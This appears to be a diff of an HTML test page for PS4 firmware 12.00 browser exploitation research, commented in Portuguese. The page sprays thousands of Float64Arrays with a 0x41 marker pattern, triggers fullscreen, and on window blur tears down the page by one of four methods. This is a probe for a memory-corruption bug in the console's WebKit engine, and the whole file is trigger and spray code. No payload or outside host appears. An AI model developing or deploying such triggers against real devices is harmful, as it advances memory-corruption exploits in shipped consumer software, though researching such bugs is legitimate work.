@@ -1,34 +1,87 @@
+
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>PS4 Research - Leandro (v12.00)</title>
+</head>
 <body>
-    <button onclick="runIsolatedTest()">Run Iframe Teardown</button>
+
+    <h1>PS4 12.00 - Sequence: Object > FS > Blur > Teardown</h1>
+    
+    <div id="status">1. Clique em um teste para preparar o objeto.</div>
+    <hr>
+
+    <button onclick="runTest(1)">1. Teardown: location.replace</button>
+    <p><small>Tenta substituir a página sem fechar o processo do navegador.</small></p>
+
+    <button onclick="runTest(2)">2. Teardown: document.body.innerHTML</button>
+    <p><small>Limpa o DOM internamente de forma agressiva.</small></p>
+
+    <button onclick="runTest(3)">3. Teardown: window.stop() + document.open()</button>
+    <p><small>Interrompe o carregamento e abre o documento sem escrever nada.</small></p>
+
+    <button onclick="runTest(4)">4. Teardown: Iframe Removal</button>
+    <p><small>Cria o objeto em um Iframe e o remove no Blur.</small></p>
+
     <div id="container"></div>
 
     <script>
-    function runIsolatedTest() {
-        const container = document.getElementById('container');
-        // Cria o ambiente isolado
-        container.innerHTML = '<iframe id="targetFrame" src="about:blank"></iframe>';
-        const frame = document.getElementById('targetFrame');
+    const PATTERN = 2.121995791e-314; // 0x4141414141414141
+
+    function runTest(type) {
+        // PASSO 1: CRIAR O OBJETO PRIMEIRO (Igual ao seu arquivo original)
+        let controllers = [];
+        for(let i = 0; i < 5000; i++) {
+            let arr = new Float64Array(8);
+            arr[0] = i;
+            controllers.push(arr);
+        }
         
-        // Entra em Fullscreen (Gatilho inicial)
-        if (document.documentElement.webkitRequestFullscreen) 
-            document.documentElement.webkitRequestFullscreen();
+        // Se for o teste 4, criamos um iframe para ser o alvo
+        if (type === 4) {
+            document.getElementById('container').innerHTML = '<iframe id="target"></iframe>';
+        }
 
+        // PASSO 2: ENTRAR EM FULL SCREEN
+        const el = document.documentElement;
+        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+        // PASSO 3: O GATILHO NO BLUR (OPTIONS)
         window.onblur = function() {
-            // 1. Criar o único Float64Array (Corrupção de 1 objeto)
-            const poison = new Float64Array(10);
-            poison.fill(2.121995791e-314); 
+            // Spray de corrupção imediato antes do teardown
+            let spray = [];
+            for(let i = 0; i < 8000; i++) {
+                let p = new Float64Array(10);
+                p.fill(PATTERN);
+                spray.push(p);
+            }
 
-            // 2. TEARDOWN ISOLADO (Substituindo o document.write da página toda)
-            const frameDoc = frame.contentWindow.document;
-            frameDoc.open();
-            frameDoc.write("<h1>Exploit Active</h1>");
-            frameDoc.close();
-            
-            console.log("Teardown executado apenas no Iframe.");
+            // PASSO 4: O TEARDOWN (Alternativas ao document.write)
+            switch(type) {
+                case 1:
+                    // Navega para uma página em branco (teardown de navegação)
+                    location.replace("about:blank");
+                    break;
+                case 2:
+                    // Destruição total do body via JS
+                    document.body.innerHTML = ""; 
+                    break;
+                case 3:
+                    // Para qualquer processo e abre o buffer (sem fechar a aba)
+                    window.stop();
+                    document.open();
+                    document.close();
+                    break;
+                case 4:
+                    // Remove o iframe (teardown localizado)
+                    const frame = document.getElementById('target');
+                    if(frame) frame.remove();
+                    break;
+            }
         };
     }
     </script>
+
 </body>
 </html>
